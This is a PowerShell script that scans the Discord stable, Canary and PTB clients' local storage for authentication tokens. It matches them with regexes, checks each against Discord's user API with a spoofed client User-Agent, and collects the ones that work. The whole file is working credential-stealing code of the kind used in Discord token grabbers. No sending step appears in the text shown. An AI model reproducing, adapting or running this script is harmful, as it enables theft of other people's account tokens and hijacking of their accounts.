$possibleTokens = @()
$discordPath = $env:APPDATA+"\discord"
$storagePath = "\Local Storage\leveldb"
$stable = $discordPath+$storagePath
$canary = $discordPath+"canary"+$storagePath
$ptb = $discordPath+"ptb"+$storagePath

# Check for Stable
if ( Test-Path -LiteralPath $stable ) {
  Set-Location $stable

  $files = @(Get-ChildItem *.ldb) 
  Foreach ($file in $files) {
    $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

    if ($mfa.length -gt 1) {
      try {
        $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
        -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
      } catch {
        Write-Output "Token is invalid (stable): $($mfa) (NOTE: token is mfa.)"
        continue
      }

      if ($r.StatusCode -eq 200) {
        Write-Output "Found a token (stable): " $mfa
        $possibleTokens += $mfa
      }
    }


    $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

    if ($tkn.length -gt 2) {
      try {
        $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
        -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
      } catch {
        Write-Output "Token is invalid (stable): $($tkn)"
        continue
      }

      if ($r.StatusCode -eq 200) {
        Write-Output "Found a token (stable): " $tkn
        $possibleTokens += $tkn
      }
    }
  }
}

# Check for Canary
if ( Test-Path -LiteralPath $canary ) {
  Set-Location $canary

  $files = @(Get-ChildItem *.ldb)
  Foreach ($file in $files) {
    $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

    if ($mfa.length -gt 1) {
      try {
        $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
        -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
      } catch {
        Write-Output "Token is invalid (canary): $($mfa) (NOTE: token is mfa.)"
        continue
      }

      if ($r.StatusCode -eq 200) {
        Write-Output "Found a token (canary): " $mfa
        $possibleTokens += $mfa
      }
    }

    $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
    try {
      $tkn = $tkn -split " "
    } catch {
      Write-Output "Token is invalid (canary): $($tkn)"
      continue
    }

    Foreach ($tkn in $tkn) {
      if ($tkn.length -gt 2) {
        try {
          $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
          -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
        } catch {
          Write-Output "Token is invalid (canary): $($tkn)"
          continue
        }
  
        if ($r.StatusCode -eq 200) {
          Write-Output "Found a token (canary): " $tkn
          $possibleTokens += $tkn
        }
      }
    }

  }
}

# Check for PTB
if ( Test-Path -LiteralPath $ptb ) {
  Set-Location $ptb
  
  $files = @(Get-ChildItem *.ldb)
  Foreach ($file in $files) {
    $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

    if ($mfa.length -gt 1) {
      try {
        $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
        -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
      } catch {
        Write-Output "Token is invalid (ptb): $($mfa) (NOTE: token is mfa.)"
        continue
      }

      if ($r.StatusCode -eq 200) {
        Write-Output "Found a token (ptb): " $mfa
        $possibleTokens += $mfa
      }
    }

    $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

    if ($tkn.length -gt 2) {
      try {
        $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
        -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
      } catch {
        Write-Output "Token is invalid (ptb): $($tkn)"
        continue
      }

      if ($r.StatusCode -eq 200) {
        Write-Output "Found a token (ptb): " $tkn
        $possibleTokens += $tkn
      }
    }
  }
}

